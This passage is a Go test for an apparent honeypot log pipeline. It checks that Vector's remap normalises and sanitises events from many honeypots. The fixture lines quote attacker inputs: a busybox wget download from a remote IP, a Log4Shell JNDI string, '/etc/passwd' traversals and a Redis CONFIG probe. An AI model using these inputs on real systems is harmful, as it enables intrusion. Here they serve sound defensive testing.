package instance

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"slices"
	"strings"
	"testing"
	"time"

	"gopkg.in/yaml.v3"

	"github.com/qpot/qpot/internal/config"
	"github.com/qpot/qpot/internal/database"
	"github.com/qpot/qpot/internal/intelligence"
	"github.com/qpot/qpot/internal/security"
)

// vectorRunner returns a command prefix that runs Vector, or skips the test.
// It uses a local `vector` binary, else the collector image if it is already
// present (never pulls).
func vectorRunner(t *testing.T, dir string) []string {
	t.Helper()
	if p, err := exec.LookPath("vector"); err == nil {
		return []string{p}
	}
	docker, err := exec.LookPath("docker")
	if err != nil {
		t.Skip("neither vector nor docker available")
	}
	const img = CollectorImage
	if exec.Command(docker, "image", "inspect", img).Run() != nil {
		t.Skip("vector image not present locally")
	}
	if uid, gid := os.Getuid(), os.Getgid(); uid > 0 {
		// The container runs as root: a folder it makes (its checkpoint
		// directory) is root's, and the test's own cleanup of dir cannot
		// empty it. Hand everything back first; this cleanup runs before
		// t.TempDir's, which was registered earlier.
		t.Cleanup(func() {
			out, err := exec.Command(docker, "run", "--rm", "--network", "none", "--user", "0:0",
				"--entrypoint", "chown", "-v", dir+":"+dir, img, "-R", fmt.Sprintf("%d:%d", uid, gid), dir).CombinedOutput()
			if err != nil {
				t.Logf("hand the collector's files back: %v %s", err, out)
			}
		})
	}
	return []string{docker, "run", "--rm", "-i", "-v", dir + ":" + dir, img}
}

// TestVectorRemapLive runs the generated add_qpot_metadata remap through the
// real Vector binary with log lines in each honeypot's actual format and checks
// the normalised columns the intelligence worker classifies on.
func TestVectorRemapLive(t *testing.T) {
	dir := t.TempDir()
	run := vectorRunner(t, dir)

	cfg := config.Default("vec-live")
	cfg.QPotID = "qp_vectorvectorvectorvecto"
	for _, n := range []string{"cowrie", "endlessh", "dionaea", "conpot", "heralding", "adbhoney",
		"tanner", "dicompot", "ddospot", "hellpot", "log4pot", "citrixhoneypot", "galah", "mailoney",
		"redishoneypot", "go-pot", "beelzebub", "ciscoasa", "sentrypeer", "wordpot", "medpot", "refrigeration", "miniprint"} {
		hp := cfg.Honeypots[n]
		hp.Enabled = true
		cfg.Honeypots[n] = hp
	}
	sb, err := security.NewSandbox(&cfg.Security)
	if err != nil {
		t.Fatal(err)
	}
	out, err := (&ComposeGenerator{Config: cfg, Sandbox: sb}).GenerateVectorConfig()
	if err != nil {
		t.Fatal(err)
	}
	var vc struct {
		Transforms map[string]struct {
			Source string `yaml:"source"`
		} `yaml:"transforms"`
	}
	if err := yaml.Unmarshal([]byte(out), &vc); err != nil {
		t.Fatalf("generated vector config is not YAML: %v", err)
	}
	src := vc.Transforms["add_qpot_metadata"].Source
	if src == "" {
		t.Fatal("add_qpot_metadata has no source")
	}

	// Harness: stdin lines are "<file path>\t<log line>"; split them back into
	// the .file/.message pair the file source would produce.
	harness := map[string]any{
		"data_dir": dir,
		"sources":  map[string]any{"in": map[string]any{"type": "stdin"}},
		"transforms": map[string]any{
			"split": map[string]any{"type": "remap", "inputs": []string{"in"},
				"source": "parts = split(string!(.message), \"\\t\", 2)\n.file = parts[0]\n.message = parts[1]\n"},
			"t": map[string]any{"type": "remap", "inputs": []string{"split"}, "source": src},
		},
		"sinks": map[string]any{"out": map[string]any{"type": "file", "inputs": []string{"t"},
			"path": filepath.Join(dir, "out.json"), "encoding": map[string]any{"codec": "json"}}},
	}
	hb, err := yaml.Marshal(harness)
	if err != nil {
		t.Fatal(err)
	}
	cfgPath := filepath.Join(dir, "vector.yaml")
	if err := os.WriteFile(cfgPath, hb, 0o644); err != nil {
		t.Fatal(err)
	}

	// Credential-shaped values are built here: a literal one would trip the
	// secret scanner of the CI.
	blob := "AAAAC3NzaC1lZDI1NTE5AAAAI" + strings.Repeat("Q", 43)
	fp := strings.TrimSuffix(strings.Repeat("ab:", 16), ":")
	keyID := "AKIA" + strings.Repeat("Z", 16)
	secret := strings.Repeat("s", 40)
	typed := "Hunter-" + strings.Repeat("x", 12)
	longNativeInput := strings.Repeat("x", 5000)
	nativeArchivePassword := refrigerationArchiveCanary(cfg).Values[0]
	var escapedNativePassword strings.Builder
	for _, b := range []byte(nativeArchivePassword) {
		fmt.Fprintf(&escapedNativePassword, "%%%02X", b)
	}

	in := strings.Join([]string{
		"/data/honeypots/cowrie/logs/cowrie.json\t" + `{"eventid":"cowrie.session.connect","src_ip":"203.0.113.9","src_port":55632,"dst_ip":"172.20.0.2","dst_port":22,"session":"s1","protocol":"ssh"}`,
		"/data/honeypots/cowrie/logs/cowrie.json\t" + `{"eventid":"cowrie.login.failed","username":"root","password":"123456","src_ip":"203.0.113.9","session":"s1","protocol":"ssh"}`,
		"/data/honeypots/cowrie/logs/cowrie.json\t" + `{"eventid":"cowrie.command.input","input":"uname -a","src_ip":"203.0.113.9","session":"s1","protocol":"ssh"}`,
		// Hostile/odd shapes: injected file/classification keys, wrong types,
		// out-of-range port, IPv4-mapped address.
		"/data/honeypots/cowrie/logs/cowrie.json\t" + `{"eventid":"cowrie.command.input","input":"id","src_ip":"::ffff:198.51.100.7","src_port":"70000","file":"/data/honeypots/evil/x","technique_id":"T9999","classified":1,"event_id":"not-a-uuid","metadata":[1],"username":{"a":1}}`,
		"/data/honeypots/cowrie/logs/cowrie.json\t" + `{"eventid":"cowrie.login.failed","src_ip":"not-an-ip"}`,
		"/data/honeypots/cowrie/logs/cowrie.json\t{broken",
		"/data/honeypots/cowrie/logs/cowrie.log\t2026-11-02 05:09:25 [-] Ready to accept SSH connections",
		"/data/honeypots/endlessh/logs/endlessh.log\t2026-11-02T05:28:07.311Z ACCEPT host=::ffff:203.0.113.10 port=44688 fd=4 n=1/4096",
		"/data/honeypots/endlessh/logs/endlessh.log\t2026-11-02T05:26:53.114Z Port 2222",
		"/data/honeypots/dionaea/logs/dionaea.json\t" + `{"connection":{"protocol":"smbd","transport":"tcp","type":"accept"},"dst_port":445,"src_ip":"203.0.113.11","src_port":39812}`,
		"/data/honeypots/conpot/logs/conpot.json\t" + `{"data_type":"http","src_ip":"203.0.113.12","src_port":1,"dst_port":80,"request":"GET /","event_type":null}`,
		"/data/honeypots/conpot/logs/conpot.json\t" + `{"data_type":"modbus","src_ip":"203.0.113.12","dst_port":502,"event_type":"NEW_CONNECTION"}`,
		"/data/honeypots/heralding/logs/log_session.json\t" + `{"source_ip":"203.0.113.13","source_port":43128,"destination_port":21,"protocol":"ftp","num_auth_attempts":1,"auth_attempts":[{"username":"admin","password":"hunter2"}]}`,
		"/data/honeypots/adbhoney/logs/adbhoney.json\t" + `{"eventid":"adbhoney.session.connect","src_ip":"203.0.113.14","src_port":34434,"dest_port":"5555"}`,
		// Honeypots with their own field names (T-Pot 24.04.2 formats).
		"/data/honeypots/tanner/logs/tanner_report.json\t" + `{"method":"GET","path":"/wp-login.php","peer":{"ip":"203.0.113.20","port":40112},"status":200,"uuid":"u1"}`,
		"/data/honeypots/dicompot/logs/dicompot.log\t" + `{"ID":"1","IP":"203.0.113.21","Port":"52800","level":"warning","msg":"Connection from","time":"2026-11-02 08:46:24"}`,
		"/data/honeypots/dicompot/logs/dicompot.log\t" + `{"ID":"1","Status":"Finished","level":"warning","msg":"Connection","time":"2026-11-02 08:46:34"}`,
		"/data/honeypots/ddospot/logs/targets.log\t" + `{"dest_port":53,"dns_name":"example.com.","event":"attack_start","pot":"dns","proto":"udp","target_ip":"203.0.113.22","target_port":52840}`,
		"/data/honeypots/hellpot/logs/hellpot.log\t" + `{"level":"info","USERAGENT":"x","REMOTE_ADDR":"203.0.113.23","URL":"/.env","time":"2026-11-02T08:47:50Z","message":"NEW"}`,
		"/data/honeypots/hellpot/logs/hellpot.log\t" + `{"level":"info","caller":"0.0.0.0:8080","message":"Listening and serving HTTP..."}`,
		"/data/honeypots/log4pot/logs/log4pot.log\t" + `{"reason": "request", "server_port": 8080, "client": "203.0.113.24", "port": 42458, "request": "GET /?x=${jndi:ldap://a/b} HTTP/1.1"}`,
		"/data/honeypots/log4pot/logs/log4pot.log\t" + `{"reason": "start", "timestamp": "2026-11-02T08:15:14.894487"}`,
		"/data/honeypots/citrixhoneypot/logs/server.log\t" + `{"asctime": "2026-11-02 08:15:24,516", "levelname": "INFO", "message": "(203.0.113.25:51234): GET /vpn/../vpns/cfg/smb.conf"}`,
		"/data/honeypots/galah/logs/galah.json\t" + `{"dest_port":"8080","msg":"successfulResponse","request.method":"GET","request.requestURI":"/admin","src_ip":"203.0.113.26","src_port":"39202"}`,
		"/data/honeypots/mailoney/logs/log.json\t" + `{"dest_port":25,"event.type":"session","smtp_input":"HELO x\nAUTH LOGIN","src_ip":"203.0.113.27","src_port":34714}`,
		"/data/honeypots/redishoneypot/logs/redishoneypot.log\t" + `{"message":"command","event":"command","protocol":"redis","src_ip":"203.0.113.28","src_port":37198,"dest_port":6379,"command":"CONFIG","args_text":"SET dir /tmp"}`,
		"/data/honeypots/go-pot/logs/go-pot.json\t" + `{"msg":"","status":"200","src_ip":"203.0.113.29","method":"GET","path":"/admin/login.php","qs":"user=root","dest_port":"80"}`,
		"/data/honeypots/beelzebub/logs/beelzebub.json\t" + `{"command":"uname -a","dest_port":"22","msg":"New SSH Session","protocol":"SSH","src_ip":"203.0.113.30","src_port":"55688"}`,
		"/data/honeypots/ciscoasa/logs/ciscoasa.json\t" + `{"event_type":"error","src_ip":"203.0.113.31","src_port":40596,"dest_port":8443,"protocol":"tcp","payload":""}`,
		"/data/honeypots/sentrypeer/logs/sentrypeer.json\t" + `{"source_ip":"203.0.113.32:5061","transport_type":"UDP","sip_method":"OPTIONS"}`,
		"/data/honeypots/wordpot/logs/profile-state.json\t" + `{"pid": 1, "profile_count": 4, "profile_id": "maintenance-lag"}`,
		"/data/honeypots/medpot/logs/medpot.log\t" + `{"level":"info","message":"Connection found","src_port":"44462","src_ip":"203.0.113.33","data":"TVNIfA=="}`,
		// A public key login (the bait's stolen key trips on its key and
		// fingerprint), a password typed at the emulated ssh's prompt and the
		// credentials the emulated aws signs with.
		"/data/honeypots/cowrie/logs/cowrie.json\t" + `{"eventid":"cowrie.client.fingerprint","username":"root","fingerprint":"` + fp + `","key":"ssh-ed25519 ` + blob + `","type":"ssh-ed25519","src_ip":"203.0.113.40","session":"s9","protocol":"ssh"}`,
		"/data/honeypots/cowrie/logs/cowrie.json\t" + `{"eventid":"cowrie.command.input","realm":"ssh","input":"` + typed + `","src_ip":"203.0.113.41","session":"s10","protocol":"ssh"}`,
		"/data/honeypots/cowrie/logs/cowrie.json\t" + `{"eventid":"cowrie.credentials.use","realm":"aws","username":"` + keyID + `","password":"` + secret + `","service":"sts","input":"aws sts get-caller-identity","src_ip":"203.0.113.42","session":"s11","protocol":"ssh"}`,
		// Captured pinned-image schema: protocol rather than data_type, and
		// nested Modbus fields. Preserve source profiles across queued logs.
		"/data/honeypots/conpot/logs/conpot.json\t" + `{"protocol":"modbus","src_ip":"203.0.113.50","dst_port":502,"event_type":null,"data":{"slave_id":1,"function_code":3},"request":"b'00010000000601039c410001'","response":"b'0302007b'","template":"plc_modbus"}`,
		"/data/honeypots/conpot/logs/conpot.json\t" + `{"protocol":"modbus","src_ip":"203.0.113.51","dst_port":502,"event_type":null,"data":{"slave_id":1,"function_code":6},"request":"b'00010000000601069c41007b'","response":"b'069c41007b'","template":"plc_modbus"}`,
		"/data/honeypots/conpot/logs/conpot.json\t" + `{"protocol":"modbus","src_ip":"203.0.113.52","dst_port":502,"event_type":null,"data":{"slave_id":1,"function_code":3},"request":"b'0001000000060103ffff0001'","response":"b'8302'","template":"plc_modbus"}`,
		"/data/honeypots/conpot/logs/conpot.json\t" + `{"protocol":"modbus","src_ip":"203.0.113.53","dst_port":502,"event_type":null,"data":{"slave_id":1,"function_code":43},"request":"b'000100000005012b0e0100'","template":"plc_modbus"}`,
		"/data/honeypots/conpot/logs/conpot.json\t" + `{"protocol":"modbus","src_ip":"203.0.113.54","event_type":null,"data":{"slave_id":1,"function_code":8},"template":"plc_modbus"}`,
		"/data/honeypots/conpot/logs/conpot.json\t" + `{"protocol":"modbus","src_ip":"203.0.113.55","event_type":null,"data":{"slave_id":999,"function_code":999},"template":"untrusted-template"}`,
		"/data/honeypots/conpot/logs/conpot.json\t" + `{"protocol":"dnp3","src_ip":"203.0.113.56","dst_port":20000,"event_type":"REQUEST","data":{"object_groups":[60]},"request":"READ","template":"IEC104"}`,
		"/data/honeypots/conpot/logs/conpot.json\t" + `{"protocol":"IEC104","src_ip":"203.0.113.57","dst_port":2404,"event_type":"NEW_CONNECTION","data":{},"template":"IEC104"}`,
		"/data/honeypots/refrigeration/logs/events.json\t" + `{"event_type":"refrigeration.auth.failed","src_ip":"203.0.113.70","src_port":41001,"dst_port":8080,"protocol":"http","username":"admin","password":"wrong","action":"login","success":false,"metadata":{"profile":"ak-sm800a","model":"AK-SM 800A","firmware":"3.3.0","role":"supervisor"}}`,
		"/data/honeypots/refrigeration/logs/events.json\t" + `{"event_type":"refrigeration.auth.success","src_ip":"203.0.113.71","src_port":41002,"protocol":"http","username":"operator","password":"captured-input","action":"login","success":true}`,
		"/data/honeypots/refrigeration/logs/events.json\t" + `{"event_type":"refrigeration.read","src_ip":"203.0.113.72","protocol":"http","action":"readings","method":"GET","path":"/readings","success":true,"request":"GET /readings","metadata":{"key":"must-not-be-watched","profile":"retail"}}`,
		"/data/honeypots/refrigeration/logs/events.json\t" + `{"event_type":"refrigeration.write.attempt","src_ip":"203.0.113.73","protocol":"http","action":"setpoint","device_id":"case01","success":false,"request":"setpoint=-20","metadata":{"parameter":"setpoint","value":-20,"reason":"pending"}}`,
		"/data/honeypots/refrigeration/logs/events.json\t" + `{"event_type":"refrigeration.write.success","src_ip":"203.0.113.74","protocol":"http","action":"setpoint","success":true,"metadata":{"outcome":"emulated value changed","previous_value":-18,"value":-20}}`,
		"/data/honeypots/refrigeration/logs/events.json\t" + `{"event_type":"refrigeration.write.denied","src_ip":"203.0.113.75","protocol":"http","action":"defrost","success":false,"metadata":{"reason":"read-only role"}}`,
		"/data/honeypots/refrigeration/logs/events.json\t" + `{"event_type":"refrigeration.alarm","src_ip":"203.0.113.76","protocol":"http","action":"alarm-list","device_id":"case01","success":true}`,
		"/data/honeypots/refrigeration/logs/events.json\t" + `{"event_type":"refrigeration.read","src_ip":"203.0.113.77","protocol":"http","action":"configuration","success":true}`,
		"/data/honeypots/refrigeration/logs/events.json\t" + `{"event_type":"refrigeration.export","src_ip":"203.0.113.78","protocol":"http","action":"maintenance","success":true,"request":"GET /exports/maintenance.zip","response":"do-not-match-response-secret"}`,
		"/data/honeypots/refrigeration/logs/events.json\t" + `{"event_type":"refrigeration.exploit.attempt","src_ip":"203.0.113.79","protocol":"http","action":"request","request":"GET /../../etc/passwd","command":"never execute OS input","success":false}`,
		"/data/honeypots/refrigeration/logs/events.json\t" + `{"event_type":"refrigeration.malformed","src_ip":"203.0.113.80","protocol":"http","action":"xml","request":"<broken","success":false}`,
		"/data/honeypots/refrigeration/logs/events.json\t" + `{"event_type":"injected.event","eventid":"cowrie.command.input","honeypot":"cowrie","file":"/data/honeypots/cowrie/logs/x.json","src_ip":"203.0.113.81","protocol":"http","metadata":{"source_ip":"198.51.100.99","profile":[],"key":"must-not-be-watched"}}`,
		"/data/honeypots/refrigeration/logs/events.json\t" + `{"event_type":"refrigeration.read","src_ip":"203.0.113.82","protocol":"http","username":"` + longNativeInput + `","request":"` + longNativeInput + `","metadata":{"reason":"` + longNativeInput + `","request_uri":"` + longNativeInput + `","query":"` + longNativeInput + `","user_agent":"` + longNativeInput + `"}}`,
		"/data/honeypots/refrigeration/logs/events.json\t" + `{"event_type":"refrigeration.read","src_ip":"203.0.113.83","src_port":42001,"protocol":"http","action":"metadata","method":"GET","path":"/metadata","request":"/metadata?archive=` + escapedNativePassword.String() + `","metadata":{"request_uri":"/metadata?archive=` + escapedNativePassword.String() + `","query":"archive=` + nativeArchivePassword + `","user_agent":"fleet-agent"}}`,
		"/data/honeypots/refrigeration/logs/events.json\t" + `{"event_type":"refrigeration.read","src_ip":"203.0.113.84","src_port":42002,"protocol":"http","action":"metadata","method":"GET","path":"/metadata","request":"/metadata","metadata":{"request_uri":"/metadata","user_agent":"fleet-agent ` + nativeArchivePassword + `"}}`,
		"/data/honeypots/refrigeration/logs/events.json\t" + `{"event_type":"refrigeration.malformed","src_ip":"203.0.113.85","src_port":42003,"protocol":"http","action":"http.method","method":"POST","path":"/unknown","success":false,"request":"/unknown?probe=1","metadata":{"request_uri":"/unknown?probe=1","query":"probe=1","user_agent":"method-probe","reason":"method"}}`,
		"/data/honeypots/refrigeration/logs/events.json\t" + `{"event_type":"refrigeration.read","src_ip":"203.0.113.86","src_port":42004,"protocol":"http","action":"not_found","method":"GET","path":"/unknown","request":"/unknown?archive=` + nativeArchivePassword + `","metadata":{"request_uri":"/unknown?archive=` + nativeArchivePassword + `","query":"archive=` + nativeArchivePassword + `"}}`,
		"/data/honeypots/refrigeration/logs/events.json\t" + `{"event_type":"refrigeration.overload","src_ip":"203.0.113.87","src_port":42005,"protocol":"http","action":"http","method":"GET","path":"/metadata.json","success":false,"request":"/metadata.json","metadata":{"reason":"busy"}}`,
		// adbhoney names its port only on session.connect; a command line has none.
		"/data/honeypots/adbhoney/logs/adbhoney.json\t" + `{"eventid":"adbhoney.command.input","input":"cd /data/local/tmp; busybox wget http://198.51.100.9/m -O m","src_ip":"203.0.113.88","timestamp":"2026-11-08T14:27:19.864039Z","unixtime":1794148039,"session":"38ab10fcac37","sensor":"honeypot01"}`,
		// miniprint (T-Pot 24.04.2): the request line is payload_preview, a
		// rejected path virtual_path; "command" is only the PJL keyword.
		"/data/honeypots/miniprint/logs/miniprint.json\t" + `{"timestamp":"2026-11-08T14:28:01.384972Z","info":"PJL command received","persona":"hp","session_id":"9aacbd8a","src_ip":"203.0.113.89","src_port":42873,"dest_ip":"172.20.0.5","dest_port":9100,"protocol":"pjl","action":"request","event":"command_received","command":"FSUPLOAD","payload_sha256":"038533bb","payload_preview":"@PJL FSUPLOAD NAME=\"0:/../../etc/passwd\" OFFSET=0 SIZE=4096\\r\\n"}`,
		"/data/honeypots/miniprint/logs/miniprint.json\t" + `{"timestamp":"2026-11-08T14:28:01.385216Z","info":"Rejected virtual filesystem path traversal","persona":"hp","session_id":"9aacbd8a","src_ip":"203.0.113.89","src_port":42873,"dest_ip":"172.20.0.5","dest_port":9100,"protocol":"pjl","action":"reject","event":"path_traversal","virtual_path":"/../../etc/passwd"}`,
		// A line QPot's cowrie logger cut to fit (jsonlog.py): which values,
		// and the whole command's length and hash, are kept with the event.
		"/data/honeypots/cowrie/logs/cowrie.json\t" + `{"eventid":"cowrie.command.input","input":"echo start","message":"CMD: echo start","src_ip":"203.0.113.90","session":"cut1","qpot_truncated":{"input":{"chars":60050,"sha256":"` + strings.Repeat("ab", 32) + `"},"message":{"chars":60055,"sha256":"` + strings.Repeat("cd", 32) + `"}}}`,
		"/data/honeypots/cowrie/logs/cowrie.json\t" + `{"eventid":"cowrie.command.input","input":"id","src_ip":"203.0.113.91","session":"cut2","qpot_truncated":{"input":{"chars":"many","sha256":["x"]},"x":1}}`,
		// The honeypot's own time is kept beside the collector's; anything
		// in that field that is no time is not.
		"/data/honeypots/cowrie/logs/cowrie.json\t" + `{"eventid":"cowrie.command.input","input":"w","src_ip":"203.0.113.92","session":"t1","timestamp":"2026-11-07T10:00:00.123456Z"}`,
		"/data/honeypots/cowrie/logs/cowrie.json\t" + `{"eventid":"cowrie.command.input","input":"w","src_ip":"203.0.113.93","session":"t2","timestamp":"yesterday\u001b[2J"}`,
	}, "\n") + "\n"

	cmd := exec.Command(run[0], append(run[1:], "--quiet", "--config", cfgPath)...)
	cmd.Stdin = strings.NewReader(in)
	var stderr bytes.Buffer
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		t.Fatalf("vector failed: %v\n%s", err, stderr.String())
	}

	f, err := os.Open(filepath.Join(dir, "out.json"))
	if err != nil {
		t.Fatalf("no output: %v\n%s", err, stderr.String())
	}
	defer f.Close()
	type row struct {
		Honeypot   string            `json:"honeypot"`
		EventType  string            `json:"event_type"`
		SourceIP   string            `json:"source_ip"`
		SourcePort int               `json:"source_port"`
		DestPort   int               `json:"dest_port"`
		Protocol   string            `json:"protocol"`
		Username   string            `json:"username"`
		Password   string            `json:"password"`
		Command    string            `json:"command"`
		Payload    string            `json:"payload"`
		Metadata   map[string]string `json:"metadata"`
		Timestamp  string            `json:"timestamp"`
		Technique  *string           `json:"technique_id"`
		Classified any               `json:"classified"`
		EventID    any               `json:"event_id"`
		QPotID     string            `json:"qpot_id"`
		SensorID   string            `json:"sensor_id"`
	}
	var rows []row
	sc := bufio.NewScanner(f)
	sc.Buffer(make([]byte, 1<<20), 1<<20)
	for sc.Scan() {
		var r row
		if err := json.Unmarshal(sc.Bytes(), &r); err != nil {
			t.Fatalf("bad output line %q: %v", sc.Text(), err)
		}
		rows = append(rows, r)
	}
	// Broken JSON, cowrie.log chatter, endlessh's banner line
	// and the lines without an attacker address (dicompot's finished line,
	// hellpot's/log4pot's startup lines, wordpot's profile state) must be
	// dropped.
	if len(rows) != 61 {
		t.Fatalf("got %d events, want 61: %+v", len(rows), rows)
	}
	if r := rows[59]; r.SourceIP != "203.0.113.92" || r.Metadata["observed_at"] != "2026-11-07T10:00:00.123456Z" || strings.HasPrefix(r.Timestamp, "2026-11-07") {
		t.Errorf("the honeypot's own time is not kept beside the collector's: %q, stored %q", r.Metadata["observed_at"], r.Timestamp)
	}
	if r := rows[60]; r.SourceIP != "203.0.113.93" || r.Metadata["observed_at"] != "" {
		t.Errorf("a timestamp field that is no time was kept: %q", r.Metadata["observed_at"])
	}
	if r := rows[57]; r.Command != "echo start" || r.Metadata["truncated"] != "input,message" ||
		r.Metadata["input_chars"] != "60050" || r.Metadata["input_sha256"] != strings.Repeat("ab", 32) {
		t.Errorf("a line the cowrie logger cut: %+v", r)
	}
	// A log line may claim anything: only a length and a hash are kept.
	if r := rows[58]; r.Command != "id" || r.Metadata["truncated"] != "input,x" || r.Metadata["input_chars"] != "" || r.Metadata["input_sha256"] != "" {
		t.Errorf("a forged cut record: %+v", r)
	}
	// miniprint: the operator sees what was asked for, and the categories
	// read it (with only the PJL keyword they never matched).
	if r := rows[55]; r.EventType != "miniprint.command_received" || r.Command != "FSUPLOAD" ||
		!strings.HasPrefix(r.Payload, `@PJL FSUPLOAD NAME="0:/../../etc/passwd"`) || r.DestPort != 9100 {
		t.Errorf("miniprint request row: %+v", r)
	}
	if r := rows[56]; r.EventType != "miniprint.path_traversal" || r.Payload != "/../../etc/passwd" {
		t.Errorf("miniprint path traversal row: %+v", r)
	}
	for _, r := range rows[55:57] {
		ev := &database.Event{Honeypot: r.Honeypot, EventType: r.EventType, Command: r.Command, Payload: []byte(r.Payload)}
		if got := intelligence.Categorize(ev); !slices.Contains(got, intelligence.CatPathTraversal) {
			t.Errorf("%s: categories %v, want %s", r.EventType, got, intelligence.CatPathTraversal)
		}
	}
	// Its only port: the attack map shows the command as ADB, not OTHER / N/A.
	if r := rows[54]; r.EventType != "adbhoney.command.input" || r.DestPort != 5555 || r.SourceIP != "203.0.113.88" {
		t.Errorf("adbhoney command row: %+v", r)
	}
	if r := rows[48]; len(r.Username) != 256 || len(r.Payload) != 4096 || len(r.Metadata["reason"]) != 256 || len(r.Metadata["request_uri"]) != 2048 || len(r.Metadata["query"]) != 1024 || len(r.Metadata["user_agent"]) != 512 {
		t.Errorf("native event fields escaped their size bounds: username=%d payload=%d reason=%d URI=%d query=%d user_agent=%d", len(r.Username), len(r.Payload), len(r.Metadata["reason"]), len(r.Metadata["request_uri"]), len(r.Metadata["query"]), len(r.Metadata["user_agent"]))
	}
	if r := rows[49]; r.SourceIP != "203.0.113.83" || r.SourcePort != 42001 || r.EventType != "refrigeration.read" || r.Metadata["query"] != "archive="+nativeArchivePassword || r.Metadata["request_uri"] != "/metadata?archive="+escapedNativePassword.String() {
		t.Error("native raw/decoded request target or source attribution was discarded")
	}
	if r := rows[50]; r.Metadata["user_agent"] != "fleet-agent "+nativeArchivePassword || r.SourceIP != "203.0.113.84" {
		t.Error("credential reuse supplied in User-Agent was discarded")
	}
	if r := rows[51]; r.EventType != "refrigeration.malformed" || r.Metadata["method"] != "POST" || r.Metadata["path"] != "/unknown" || r.Metadata["action"] != "http.method" || r.Metadata["reason"] != "method" || r.Payload != "/unknown?probe=1" || r.SourceIP != "203.0.113.85" {
		t.Errorf("unsupported HTTP method observation was discarded or mislabeled: %+v", r)
	}
	// A busy rejection the supervisor recorded keeps its own event type.
	if r := rows[53]; r.EventType != "refrigeration.overload" || r.Metadata["reason"] != "busy" || r.SourceIP != "203.0.113.87" {
		t.Errorf("overload row: %+v", r)
	}
	if r := rows[52]; r.Payload != "/unknown?archive="+nativeArchivePassword || r.Metadata["request_uri"] != r.Payload || r.Metadata["query"] != "archive="+nativeArchivePassword || r.SourceIP != "203.0.113.86" {
		t.Error("literal canary credential in an unknown GET target was discarded")
	}
	for i, eventType := range []string{"auth.failed", "auth.success", "read", "write.attempt", "write.success", "write.denied", "alarm", "read", "export", "exploit.attempt", "malformed", "request"} {
		r := rows[36+i]
		if r.Honeypot != "refrigeration" || r.EventType != "refrigeration."+eventType || r.SourceIP != fmt.Sprintf("203.0.113.%d", 70+i) || r.Protocol != "http" || r.Metadata["state_scope"] != "simulated" {
			t.Errorf("native refrigeration event %d lost attribution or semantics: %+v", i, r)
		}
		if r.Command != "" || r.Metadata["key"] != "" || r.Metadata["source_ip"] != "" || strings.Contains(r.Payload, "do-not-match-response-secret") {
			t.Errorf("refrigeration copied non-input or unapproved fields: %+v", r)
		}
	}
	if r := rows[36]; r.Username != "admin" || r.Password != "wrong" || r.SourcePort != 41001 || r.DestPort != 8080 || r.Metadata["success"] != "false" || r.Metadata["firmware"] != "3.3.0" {
		t.Errorf("native authentication lost credentials, socket address or device context: %+v", r)
	}
	if r := rows[39]; r.Metadata["parameter"] != "setpoint" || r.Metadata["value"] != "-20" || r.Metadata["device_id"] != "case01" {
		t.Errorf("setpoint attempt lost control metadata: %+v", r)
	}
	if r := rows[25]; r.EventType != "cowrie.client.fingerprint" || r.Username != "root" ||
		r.Metadata["fingerprint"] != fp || r.Metadata["key"] != "ssh-ed25519 "+blob {
		t.Errorf("public key login: key and fingerprint not kept: %+v", r)
	}
	if r := rows[26]; r.Command != typed || r.Metadata["realm"] != "ssh" {
		t.Errorf("input at ssh's prompt: %+v", r)
	}
	if r := rows[27]; r.EventType != "cowrie.credentials.use" || r.Username != keyID || r.Password != secret ||
		r.Command != "aws sts get-caller-identity" || r.Metadata["realm"] != "aws" {
		t.Errorf("aws credentials use: %+v", r)
	}

	r := rows[0]
	if r.Honeypot != "cowrie" || r.EventType != "cowrie.session.connect" || r.SourceIP != "203.0.113.9" ||
		r.SourcePort != 55632 || r.DestPort != 22 || r.Protocol != "ssh" || r.Metadata["session"] != "s1" || r.QPotID != "" || r.SensorID != cfg.SensorID() {
		t.Errorf("cowrie connect: %+v", r)
	}
	if r := rows[1]; r.Username != "root" || r.Password != "123456" || r.EventType != "cowrie.login.failed" {
		t.Errorf("cowrie login: %+v", r)
	}
	if r := rows[2]; r.Command != "uname -a" {
		t.Errorf("cowrie command input not mapped to command: %+v", r)
	}
	if r := rows[3]; r.Honeypot != "cowrie" || r.SourceIP != "198.51.100.7" || r.SourcePort != 0 ||
		r.Technique != nil || r.Classified != nil || r.EventID == "not-a-uuid" || !eventUUID.MatchString(fmt.Sprint(r.EventID)) || r.Username != "" || r.Command != "id" {
		t.Errorf("hostile cowrie line not sanitised: %+v", r)
	}
	if r := rows[4]; r.SourceIP != "0.0.0.0" {
		t.Errorf("invalid src_ip not replaced: %+v", r)
	}
	if r := rows[5]; r.Honeypot != "endlessh" || r.EventType != "endlessh.connection.accept" || r.SourceIP != "203.0.113.10" || r.SourcePort != 44688 {
		t.Errorf("endlessh: %+v", r)
	}
	if r := rows[6]; r.EventType != "dionaea.connection.accept" || r.Protocol != "smbd" || r.DestPort != 445 {
		t.Errorf("dionaea: %+v", r)
	}
	if r := rows[7]; r.EventType != "conpot.http.probe" || r.Payload != "GET /" || r.Protocol != "http" {
		t.Errorf("conpot http: %+v", r)
	}
	if r := rows[8]; r.EventType != "conpot.modbus.new_connection" {
		t.Errorf("conpot modbus: %+v", r)
	}
	if r := rows[9]; r.EventType != "heralding.login.failed" || r.Username != "admin" || r.Password != "hunter2" ||
		r.SourceIP != "203.0.113.13" || r.DestPort != 21 {
		t.Errorf("heralding: %+v", r)
	}
	if r := rows[10]; r.DestPort != 5555 || r.SourcePort != 34434 {
		t.Errorf("adbhoney: %+v", r)
	}

	// Test the actual image schema through the real transform and classifier.
	// Reads and exceptions must not become unauthorized control writes.
	classifier := intelligence.NewClassifier(intelligence.NewATTCKLoader(t.TempDir()), nil)
	conpotWant := []struct {
		event, operation, function, unit, profile, exception string
	}{
		{"conpot.modbus.read", "read", "3", "1", "plc_modbus", ""},
		{"conpot.modbus.command", "write", "6", "1", "plc_modbus", ""},
		{"conpot.modbus.read", "read", "3", "1", "plc_modbus", "02"},
		{"conpot.modbus.read", "read", "43", "1", "plc_modbus", ""},
		{"conpot.modbus.request", "", "8", "1", "plc_modbus", ""},
		{"conpot.modbus.request", "", "", "", "", ""},
		{"conpot.dnp3.read", "read", "", "", "IEC104", ""},
		{"conpot.iec104.new_connection", "", "", "", "IEC104", ""},
	}
	for i, want := range conpotWant {
		r := rows[28+i]
		if r.EventType != want.event || r.Metadata["operation"] != want.operation ||
			r.Metadata["function_code"] != want.function || r.Metadata["unit_id"] != want.unit ||
